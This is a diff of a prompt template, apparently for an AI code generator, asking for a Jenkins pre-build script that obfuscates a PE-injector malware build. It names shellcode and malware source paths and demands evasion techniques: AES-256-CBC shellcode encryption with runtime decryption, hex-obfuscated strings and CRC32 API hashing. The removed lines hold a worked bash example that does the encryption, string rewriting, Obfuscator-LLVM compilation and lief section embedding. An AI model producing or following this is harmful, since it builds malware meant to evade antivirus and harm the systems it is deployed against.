@@ -13,36 +13,22 @@ You are creating a production-grade pre-build obfuscation script that MUST follo
 - Wrap all paths in quotes
 - No literal control characters (\\0-\\1F)
 
-2. Pipeline Environment Variables (USE THESE EXACTLY):
-- $SHELLCODE_PATH: Path to the generated shellcode C++ file
-- $MALWARE_PATH: Path to the main malware injector C++ source
-- $EXECUTABLE_NAME: Output Windows binary name
+2. Pipeline Requirements:
+- Must work with Jenkins environment variables:
+  SHELLCODE_PATH=src/Simple/PE-Injector/base.cpp
+  MALWARE_PATH=src/Simple/PE-Injector/PE-Injector.cpp
+  EXECUTABLE_NAME=injector.exe
+- Preserve original compilation command (DO NOT INCLUDE COMPILATION STEP IN PRE-BUILD SCRIPT, THIS WILL BE RUN AFTER THE PRE-BUILD SCRIPT IS RAN IN A DIFFERENT STAGE IN THE PIPELINE):
+  x86_64-w64-mingw32-g++ -std=c++17 -static -o $EXECUTABLE_NAME $MALWARE_PATH -lpsapi
 
-3. Pre-Build Script Requirements:
-- Must be compatible with a Jenkins CI runner
-- Do not assume Obfuscator-LLVM is present — **detect if it's available before using it**
-- Remove or skip `-mllvm`, `-fla`, `-sub`, `-bcf` if not using `clang++`
-- Shellcode must be AES-256-CBC encrypted and saved as `const unsigned char buf[] = {...}` in `$SHELLCODE_PATH`
-- Replace string literals in `$MALWARE_PATH` with obfuscated hex string equivalents (use `sed -i`)
-
-4. Required Evasion Techniques:
+3. Required Evasion Techniques:
+[IMPLEMENT ALL]
 - AES-256-CBC encryption with runtime decryption
-- CRC32 API hashing with dynamic resolution (mention but do not implement here if not possible)
-- If `lief` is required, install it using `pip install lief` (not apt)
-
-5. Compilation Logic:
-- If `clang++` is available:
-  - Use Obfuscator-LLVM flags `-mllvm -fla -mllvm -sub -mllvm -bcf`
-- Else:
-  - Use `x86_64-w64-mingw32-g++ -std=c++17 -static -o "$EXECUTABLE_NAME" "$MALWARE_PATH" -lpsapi -lcrypto`
-
-6. Final Build Steps:
-- Add `.crypted_key` and `.crypted_iv` sections to the output binary using `lief`
-- Clean up intermediate files (like `encrypted.bin` or `obfuscator` folders)
+- CRC32 API hashing with dynamic resolution
 
 EXAMPLE OUTPUT:
 {
-    "pre-build": "#!/bin/bash\\n# Install dependencies\\napt-get update && apt-get install -y openssl xxd mingw-w64 git cmake make clang\\npython3 -m pip install lief\\n\\n# Encrypt shellcode\\nKEY=$(openssl rand -hex 32)\\nIV=$(openssl rand -hex 16)\\nopenssl enc -aes-256-cbc -in \"$SHELLCODE_PATH\" -out encrypted.bin -K \"$KEY\" -iv \"$IV\"\\nxxd -i encrypted.bin | sed 's/unsigned.*\\[.*\\]/const unsigned char buf[]/' > \"$SHELLCODE_PATH\"\\n\\n# Obfuscate strings\\nsed -i 's/\"Usage: %s <PID>\\\\n\"/\"\\\\x55\\\\x73\\\\x61...\"/g' \"$MALWARE_PATH\"\\n...\\n\\n# Compile\\nif command -v clang++ > /dev/null; then\\n  clang++ -std=c++17 -mllvm -fla -mllvm -sub -mllvm -bcf -o \"$EXECUTABLE_NAME\" \"$MALWARE_PATH\" -lpsapi -lcrypto\\nelse\\n  x86_64-w64-mingw32-g++ -std=c++17 -static -o \"$EXECUTABLE_NAME\" \"$MALWARE_PATH\" -lpsapi -lcrypto\\nfi\\n\\n# Add key/iv sections\\npython3 -c \\\"import lief; f=lief.parse('$EXECUTABLE_NAME'); f.add_section('.crypted_key', bytes.fromhex('$KEY')); f.add_section('.crypted_iv', bytes.fromhex('$IV')); f.write('$EXECUTABLE_NAME')\\\"\\n\\n# Cleanup\\nrm -rf encrypted.bin obfuscator build"
+    "pre-build": "#!/bin/bash\\n# Install dependencies\\nsudo apt-get update && sudo apt-get install -y <dependencies>\\n<other commands here>"
 }
 """
 
